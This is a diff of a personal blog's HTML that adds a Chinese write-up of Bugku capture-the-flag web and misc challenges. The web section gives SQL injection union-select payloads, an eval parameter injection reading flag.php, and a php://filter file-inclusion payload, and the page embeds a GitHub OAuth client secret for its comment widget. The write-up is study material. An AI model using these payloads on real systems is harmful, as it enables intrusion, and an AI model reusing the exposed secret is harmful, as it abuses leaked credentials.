@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>博客</title>
+    <title>bugku write-up · 博客</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,7 +203,7 @@
 </head>
 
     
-        <body class="about-body">
+        <body class="post-body">
     
     
 <header class="header">
@@ -211,6 +211,15 @@
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Big pig hoof’s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">bugku write-up</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>Big pig hoof’s blog</a>
 </header>
@@ -229,23 +238,67 @@ height:50vh;
     <!-- 主页  -->
     
     
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/21.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            About
+            bugku write-up
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "write-up">write-up</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">526</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/10/08</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -346,13 +399,89 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <!-- 不可以删除，否则会调用post的layout  -->
-<main class="main about-page">
+            <main class="main post-page">
     <article class="article-entry">
-        <p>Money is not the only answer, <br>but it trully makes a big difference. </p>
-<p>无道人之短，无说己之长。<br>行之苟有恒，久久自芬芳。</p>
+        <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="成绩查询"><a href="#成绩查询" class="headerlink" title="成绩查询"></a>成绩查询</h3><p>先试试id=1正常输出，然后试试id=1’没有东西输出，再试试注释之后id=1’#又可以正常显示，这一题没有什么难点，也没有过滤，就是按照正常的步骤一步一步下来就行</p>
+<pre><code>id=1&apos; order by 4#   //猜测列数，4列。
+id=-1&apos; union select 1,database(),2,3 #  //爆数据库名 skctf_flag
+id=-1&apos; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#//爆表名 fl4g,sc
+id=-1&apos; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x666c3467#   //爆列名skctf_flag
+id=-1&apos; union select 1,skctf_flag,2,3 from fl4g#  //爆flag
+</code></pre><h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><p>F12 查看源码发现最后有一行被注释以及被Unicode加密后的代码，<br>抓出来丢去在线解密<br> <img src="https://i.imgur.com/nwJsXzq.png" alt=""></p>
+<pre><code>KEY{J2sa42ahJK-HS11III}
+</code></pre><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>windows下修改的文件：</p>
+<pre><code>c:\windows\system32\drivers\etc\hosts
+</code></pre><p><img src="https://i.imgur.com/p1ue4is.png" alt=""></p>
+<p>这就OK了，访问flag.bugku.com</p>
+<p> <img src="https://i.imgur.com/ZKYx57u.png" alt=""></p>
+<h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>根据代码看是从hello参数传入数据，然后在eval把传入的数据执行。<br>通过file_get_content()方式读取文件。<br><img src="https://i.imgur.com/MrkKR7q.png" alt=""></p>
+<p>即</p>
+<pre><code>?hello=file_get_contents(&apos;./flag.php&apos;)
+</code></pre><h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p>右键源代码 看见了一串js代码 先URL解码</p>
+<p><img src="https://i.imgur.com/MDHXb4N.png" alt=""><br> <img src="https://i.imgur.com/qlxdnpH.png" alt=""></p>
+<pre><code>拼接 67d709b2b54aa2aa648cf6e87a7114f1提交
+</code></pre><p><img src="https://i.imgur.com/2bgjaA3.png" alt=""></p>
+<h3 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h3><p>打开链接一番尝试后</p>
+<pre><code>观察链接http://120.24.86.145:8005/post/index.php?file=show.php
+</code></pre><p>发现File参数 易想到文件包含漏洞<br>于是构造<br><code>http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p><img src="https://i.imgur.com/f27gfZx.png" alt=""></p>
+<p>Base64解码</p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h3><p> 打开下载的图片后steg走一遍发现看不出什么<br><img src="https://i.imgur.com/m0OL8lj.png" alt=""></p>
+<p>winhex打开，尝试修改图片长高，<br><img src="https://i.imgur.com/eFSeQ1Q.png" alt=""><br> 修改之后，得到flag<br><img src="https://i.imgur.com/nx4XqmP.png" alt=""></p>
+<h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><p> <img src="https://i.imgur.com/O4AZ0jK.png" alt=""><br>telnet是明文传输的，那么我们随意追踪一段tcp流，发现flag<br>flag{d316759c281bf925d600be698a4973d5}</p>
+<h3 id="眼见非实"><a href="#眼见非实" class="headerlink" title="眼见非实"></a>眼见非实</h3><p> <img src="https://i.imgur.com/SvO8AjZ.png" alt=""><br> <img src="https://i.imgur.com/Wv7yo8X.png" alt=""><br>zip加了个zip后缀。里面有个doc文档，打开后是乱码。。。丢进winhex 504B开头 发现是个ZIP文件，继续修改后缀，然后慢慢找。。。<br>最后flag是在document.xml这个文件里<br> <img src="https://i.imgur.com/GMkRRW8.png" alt=""><br> <img src="https://i.imgur.com/p3MiHwe.png" alt=""></p>
+<h3 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h3><p><img src="![](https://i.imgur.com/1jUgKyE.png" alt=""><br><img src="https://i.imgur.com/NzygOIw.png" alt=""></p>
+<p>根据代码来看，num不能是数字字符，但是值要等于1<br>php判断字符串以1开头即可判断等值，于是构造num=1’， 即可得到flag</p>
+<p><img src="https://i.imgur.com/xLThmBm.png" alt=""></p>
 
     </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/09/30/des加密/" title= "DES加密">
+                    <div class="prevTitle">DES加密</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+<div id="container"></div>
+<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+    var gitment = new Gitment({
+        // id: "bugku write-up", // 可选。默认为 location.href
+        owner: 'presec',
+        repo: 'presec.github.io',
+        oauth: {
+            client_id: '4188eec4528ef54d7bdf',
+            client_secret: '76a0f5cb5300e763e24b98069fd3fbe1533ff65d',
+        },
+    })
+    gitment.render('container')
+
+</script>
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -416,6 +545,24 @@ height:50vh;
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#成绩查询"><span class="toc-number">1.1.</span> <span class="toc-text">成绩查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web3"><span class="toc-number">1.2.</span> <span class="toc-text">Web3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#域名解析"><span class="toc-number">1.3.</span> <span class="toc-text">域名解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#本地包含"><span class="toc-number">1.4.</span> <span class="toc-text">本地包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web4"><span class="toc-number">1.5.</span> <span class="toc-text">Web4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag在index里"><span class="toc-number">1.6.</span> <span class="toc-text">flag在index里</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#隐写"><span class="toc-number">2.1.</span> <span class="toc-text">隐写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#telnet"><span class="toc-number">2.2.</span> <span class="toc-text">telnet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#眼见非实"><span class="toc-number">2.3.</span> <span class="toc-text">眼见非实</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#矛盾"><span class="toc-number">2.4.</span> <span class="toc-text">矛盾</span></a></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -576,6 +723,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
